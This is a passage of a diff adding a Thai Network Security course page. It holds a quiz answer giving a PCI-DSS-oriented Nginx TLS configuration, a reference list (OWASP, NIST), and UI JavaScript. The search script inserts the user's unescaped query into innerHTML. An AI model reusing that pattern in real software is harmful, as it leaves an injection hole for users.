+    <p>จงกำหนดค่า Nginx TLS สำหรับเว็บไซต์อีคอมเมิร์ซที่ต้องผ่าน PCI DSS Compliance</p>
+  </div>
+  <button class="reveal-btn" onclick="revealAnswer(this)">ดูเฉลย</button>
+  <div class="quiz-answer hidden">
+    <p><strong>เฉลย:</strong> <strong>TLS Version:</strong> ssl_protocols TLSv1.2 TLSv1.3 (PCI DSS ต้องการ TLS 1.2 ขึ้นไป) <strong>Cipher Suites:</strong> ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384; ssl_prefer_server_ciphers on <strong>HSTS:</strong> add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always <strong>OCSP Stapling:</strong> ssl_stapling on; ssl_stapling_verify on; resolver 1.1.1.1 8.8.8.8 valid=300s <strong>เพิ่มเติม:</strong> ใช้ ssl_ecdh_curve X25519:prime256v1, ปิด SSL Compression, ใช้ HTTP Strict Transport Security, ปิด TLS 1.0/1.1</p>
+  </div>
+</div>
+
+</section>
+<hr>
+
+<!-- REFERENCES -->
+<section id="references" class="section-ref">
+<h2><i class="fas fa-book" aria-hidden="true"></i> เอกสารอ้างอิง (References)</h2>
+<ol>
+  <li>OWASP Foundation. (2024). <em>OWASP Top 10 — 2021</em>. Retrieved from https://owasp.org/Top10/</li>
+  <li>OWASP Foundation. (2024). <em>SQL Injection Prevention Cheat Sheet</em>. Retrieved from https://cheatsheetseries.owasp.org/</li>
+  <li>OWASP Foundation. (2024). <em>Cross-Site Scripting Prevention Cheat Sheet</em>. Retrieved from https://cheatsheetseries.owasp.org/</li>
+  <li>OWASP Foundation. (2024). <em>Cross-Site Request Forgery Prevention Cheat Sheet</em>. Retrieved from https://cheatsheetseries.owasp.org/</li>
+  <li>Stuttard, D., &amp; Pinto, M. (2018). <em>The Web Application Hacker's Handbook</em> (2nd ed.). Wiley Publishing.</li>
+  <li>Zalewski, M. (2011). <em>The Tangled Web: A Guide to Securing Modern Web Applications</em>. No Starch Press.</li>
+  <li>ModSecurity Project. (2024). <em>ModSecurity Reference Manual</em>. Retrieved from https://github.com/owasp-modsecurity/</li>
+  <li>OWASP Core Rule Set Project. (2024). <em>OWASP ModSecurity Core Rule Set Documentation</em>. Retrieved from https://coreruleset.org/</li>
+  <li>Mozilla. (2024). <em>HTTP Observatory — Security Headers</em>. Retrieved from https://observatory.mozilla.org/</li>
+  <li>NIST Special Publication 800-95 Rev. 1. (2023). <em>Guide to Secure Web Services</em>. National Institute of Standards and Technology.</li>
+</ol>
+</section>
+</main>
+</div> <!-- .layout -->
+
+<footer class="site-footer" role="contentinfo">
+  <hr class="footer-divider">
+  <p><i class="fas fa-shield-halved" aria-hidden="true"></i> รายวิชา Network Security | ภาคเรียนที่ 1 ปีการศึกษา 2569</p>
+  <p style="margin-top:0.5rem;font-size:0.8rem;">เอกสารนี้เป็นส่วนหนึ่งของรายวิชา Network Security | ภาคเรียนที่ 1 ปีการศึกษา 2569</p>
+</footer>
+
+<button id="back-to-top" aria-label="กลับไปด้านบน" title="กลับไปด้านบน">
+  <i class="fas fa-arrow-up" aria-hidden="true"></i>
+</button>
+
+<script>
+// ====== Loading Screen ======
+window.addEventListener("load", function() {
+  document.getElementById("loading-screen").classList.add("hidden");
+});
+
+// ====== Progress Bar ======
+window.addEventListener("scroll", function() {
+  var scrollTop = window.scrollY;
+  var docHeight = document.documentElement.scrollHeight - window.innerHeight;
+  var progress = docHeight > 0 ? (scrollTop / docHeight) * 100 : 0;
+  document.getElementById("progress-bar").style.width = progress + "%";
+  document.getElementById("progress-bar").setAttribute("aria-valuenow", Math.round(progress));
+});
+
+// ====== Dark Mode ======
+(function() {
+  var toggle = document.getElementById("dark-mode-toggle");
+  var icon = toggle.querySelector("i");
+  var theme = localStorage.getItem("theme");
+  if (theme === "dark") {
+    document.documentElement.setAttribute("data-theme", "dark");
+    icon.className = "fas fa-sun";
+  }
+  toggle.addEventListener("click", function() {
+    var current = document.documentElement.getAttribute("data-theme");
+    if (current === "dark") {
+      document.documentElement.removeAttribute("data-theme");
+      localStorage.setItem("theme", "light");
+      icon.className = "fas fa-moon";
+    } else {
+      document.documentElement.setAttribute("data-theme", "dark");
+      localStorage.setItem("theme", "dark");
+      icon.className = "fas fa-sun";
+    }
+  });
+})();
+
+// ====== Sidebar Toggle (mobile) ======
+(function() {
+  var btn = document.getElementById("sidebar-toggle");
+  var sidebar = document.getElementById("sidebar");
+  var overlay = document.getElementById("sidebar-overlay");
+  if (!btn || !sidebar || !overlay) return;
+  btn.addEventListener("click", function() {
+    var open = sidebar.classList.toggle("open");
+    overlay.classList.toggle("active");
+    btn.setAttribute("aria-expanded", open);
+  });
+  overlay.addEventListener("click", function() {
+    sidebar.classList.remove("open");
+    overlay.classList.remove("active");
+    btn.setAttribute("aria-expanded", "false");
+  });
+})();
+
+// ====== Scroll Spy ======
+(function() {
+  var tocLinks = document.querySelectorAll(".toc-link");
+  var sections = [];
+  tocLinks.forEach(function(link) {
+    var targetId = link.getAttribute("data-target");
+    var el = document.getElementById(targetId);
+    if (el) sections.push({ id: targetId, el: el, link: link });
+  });
+  
+  function updateActive() {
+    var scrollPos = window.scrollY + 120;
+    var currentId = null;
+    for (var i = 0; i < sections.length; i++) {
+      var s = sections[i];
+      if (s.el.offsetTop <= scrollPos) {
+        currentId = s.id;
+      }
+    }
+    tocLinks.forEach(function(l) { l.classList.remove("active"); });
+    if (currentId) {
+      var activeLink = document.querySelector('.toc-link[data-target="' + currentId + '"]');
+      if (activeLink) {
+        activeLink.classList.add("active");
+        var sidebar = document.getElementById("sidebar");
+        if (sidebar) {
+          var itemTop = activeLink.offsetTop - sidebar.offsetTop;
+          var itemBottom = itemTop + activeLink.offsetHeight;
+          var sidebarScrollTop = sidebar.scrollTop;
+          var sidebarHeight = sidebar.clientHeight;
+          if (itemTop < sidebarScrollTop) {
+            activeLink.scrollIntoView({ block: "nearest" });
+          } else if (itemBottom > sidebarScrollTop + sidebarHeight) {
+            activeLink.scrollIntoView({ block: "nearest" });
+          }
+        }
+      }
+    }
+  }
+  
+  window.addEventListener("scroll", updateActive);
+  window.addEventListener("load", updateActive);
+  setTimeout(updateActive, 500);
+})();
+
+// ====== Smooth scroll for TOC links ======
+document.querySelectorAll(".toc-link").forEach(function(link) {
+  link.addEventListener("click", function(e) {
+    e.preventDefault();
+    var targetId = this.getAttribute("data-target");
+    var target = document.getElementById(targetId);
+    if (target) {
+      var offset = 80;
+      var targetPos = target.getBoundingClientRect().top + window.scrollY - offset;
+      window.scrollTo({ top: targetPos, behavior: "smooth" });
+    }
+    var sidebar = document.getElementById("sidebar");
+    var overlay = document.getElementById("sidebar-overlay");
+    if (sidebar && sidebar.classList.contains("open")) {
+      sidebar.classList.remove("open");
+      overlay.classList.remove("active");
+      document.getElementById("sidebar-toggle").setAttribute("aria-expanded", "false");
+    }
+  });
+});
+
+// ====== Back to Top ======
+(function() {
+  var btn = document.getElementById("back-to-top");
+  window.addEventListener("scroll", function() {
+    if (window.scrollY > 400) {
+      btn.classList.add("visible");
+    } else {
+      btn.classList.remove("visible");
+    }
+  });
+  btn.addEventListener("click", function() {
+    window.scrollTo({ top: 0, behavior: "smooth" });
+  });
+})();
+
+// ====== Copy Code ======
+function copyCode(btn) {
+  var pre = btn.closest("pre");
+  var code = pre.textContent;
+  code = code.replace(/คัดลอก/g, "").trim();
+  navigator.clipboard.writeText(code).then(function() {
+    btn.innerHTML = "<i class=\"fas fa-check\" aria-hidden=\"true\"></i> คัดลอกแล้ว";
+    btn.classList.add("copied");
+    setTimeout(function() {
+      btn.innerHTML = "<i class=\"fas fa-copy\" aria-hidden=\"true\"></i> คัดลอก";
+      btn.classList.remove("copied");
+    }, 2000);
+  }).catch(function() {
+    var textarea = document.createElement("textarea");
+    textarea.value = code;
+    document.body.appendChild(textarea);
+    textarea.select();
+    document.execCommand("copy");
+    document.body.removeChild(textarea);
+    btn.innerHTML = "<i class=\"fas fa-check\" aria-hidden=\"true\"></i> คัดลอกแล้ว";
+    btn.classList.add("copied");
+    setTimeout(function() {
+      btn.innerHTML = "<i class=\"fas fa-copy\" aria-hidden=\"true\"></i> คัดลอก";
+      btn.classList.remove("copied");
+    }, 2000);
+  });
+}
+
+// ====== Expandable Sections ======
+function toggleExpand(header) {
+  var expandable = header.closest(".expandable");
+  if (!expandable) return;
+  var isExpanded = expandable.classList.toggle("expanded");
+  header.setAttribute("aria-expanded", isExpanded);
+}
+
+// ====== Reveal Answer (Quiz) ======
+function revealAnswer(btn) {
+  var card = btn.closest(".quiz-card");
+  if (!card) return;
+  card.classList.add("revealed");
+  var answer = card.querySelector(".quiz-answer");
+  if (answer) {
+    answer.classList.remove("hidden");
+  }
+  btn.textContent = "ดูเฉลยแล้ว";
+  btn.disabled = true;
+}
+
+// ====== Search ======
+(function() {
+  var searchToggle = document.getElementById("search-toggle-btn");
+  var searchOverlay = document.getElementById("search-overlay");
+  var searchInput = document.getElementById("search-input");
+  var searchResults = document.getElementById("search-results");
+  var searchCount = document.getElementById("search-count");
+  var searchClose = document.getElementById("search-close-btn");
+  
+  var mainContent = document.getElementById("main-content");
+  var searchData = [];
+  
+  function buildSearchIndex() {
+    searchData = [];
+    var sections = mainContent.querySelectorAll("h2, h3, h4, p, li, td, th, pre");
+    sections.forEach(function(el) {
+      var text = el.textContent.trim();
+      if (text.length > 10) {
+        var heading = "";
+        var parent = el.parentElement;
+        while (parent && parent !== mainContent) {
+          var prevHeading = parent.querySelector("h2, h3, h4");
+          if (prevHeading) { heading = prevHeading.textContent.trim(); break; }
+          parent = parent.parentElement;
+        }
+        searchData.push({
+          text: text,
+          heading: heading || "เนื้อหา",
+          element: el
+        });
+      }
+    });
+  }
+  
+  buildSearchIndex();
+  
+  function performSearch(query) {
+    if (!query || query.length < 2) {
+      searchResults.innerHTML = "<div class=\"no-results\">กรุณาป้อนคำค้นหาอย่างน้อย 2 ตัวอักษร</div>";
+      searchCount.textContent = "";
+      return;
+    }
+    
+    var q = query.toLowerCase();
+    var results = [];
+    var totalMatches = 0;
+    
+    searchData.forEach(function(item) {
+      var lower = item.text.toLowerCase();
+      var idx = lower.indexOf(q);
+      if (idx !== -1) {
+        var count = 0;
+        var pos = -1;
+        while ((pos = lower.indexOf(q, pos + 1)) !== -1) count++;
+        totalMatches += count;
+        
+        var snippet = item.text.substring(Math.max(0, idx - 60), idx + q.length + 120);
+        if (idx > 60) snippet = "..." + snippet;
+        if (idx + q.length + 120 < item.text.length) snippet = snippet + "...";
+        
+        snippet = snippet.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+        snippet = snippet.replace(new RegExp("(" + q.replace(/[.*+?^${}()|[\]\\]/g, "\\$&") + ")", "gi"), "<mark>$1</mark>");
+        
+        results.push({
+          heading: item.heading,
+          snippet: snippet,
+          element: item.element,
+          count: count
+        });
+      }
+    });
+    
+    if (results.length > 50) results = results.slice(0, 50);
+    
+    searchCount.textContent = totalMatches + " ผลลัพธ์";
+    
+    if (results.length === 0) {
+      searchResults.innerHTML = "<div class=\"no-results\">ไม่พบผลลัพธ์สำหรับ \"" + query + "\"</div>";
+      return;
+    }
+    
+    var html = "";
+    results.forEach(function(r) {
+      html += "<div class=\"search-result-item\" data-heading=\"" + r.heading.replace(/"/g, "&quot;") + "\">";
+      html += "<div class=\"result-heading\">" + r.heading + "</div>";
+      html += "<div class=\"result-snippet\">" + r.snippet + "</div>";
+      html += "</div>";
+    });
+    searchResults.innerHTML = html;
+    
+    searchResults.querySelectorAll(".search-result-item").forEach(function(item, i) {
+      item.addEventListener("click", function() {
+        var el = results[i].element;
+        if (el) {
+          var offset = 100;
+          var pos = el.getBoundingClientRect().top + window.scrollY - offset;
+          window.scrollTo({ top: pos, behavior: "smooth" });
+          searchOverlay.classList.remove("active");
+          el.style.transition = "background 0.5s ease";
+          el.style.background = "var(--bg-tertiary)";
+          setTimeout(function() {
+            el.style.background = "";
+          }, 1500);
+        }
+      });
+    });
+  }
+  
+  var searchTimeout = null;
+  searchInput.addEventListener("input", function() {
+    clearTimeout(searchTimeout);
+    searchTimeout = setTimeout(function() {
+      performSearch(searchInput.value);
+    }, 300);
+  });
+  
+  searchToggle.addEventListener("click", function() {
+    searchOverlay.classList.add("active");
+    setTimeout(function() { searchInput.focus(); }, 100);
+  });
+  
+  searchClose.addEventListener("click", function() {
+    searchOverlay.classList.remove("active");
+    searchInput.value = "";
+    searchResults.innerHTML = "";
+    searchCount.textContent = "";
+  });
+  
+  searchOverlay.addEventListener("click", function(e) {
+    if (e.target === searchOverlay) {
+      searchOverlay.classList.remove("active");
+      searchInput.value = "";
+      searchResults.innerHTML = "";
+      searchCount.textContent = "";
+    }
+  });
+  
+  document.addEventListener("keydown", function(e) {
+    if ((e.ctrlKey || e.metaKey) && e.key === "k") {
+      e.preventDefault();
+      searchToggle.click();
+    }
+    if (e.key === "Escape") {
+      searchOverlay.classList.remove("active");
+    }
+  });
+})();
+
+document.addEventListener("DOMContentLoaded", function() {
+  document.querySelectorAll(".expandable.expanded").forEach(function(el) {
+    var header = el.querySelector(".expandable-header");
+    if (header) header.setAttribute("aria-expanded", "true");
+  });
+});
+</script>
+</body>
+</html>
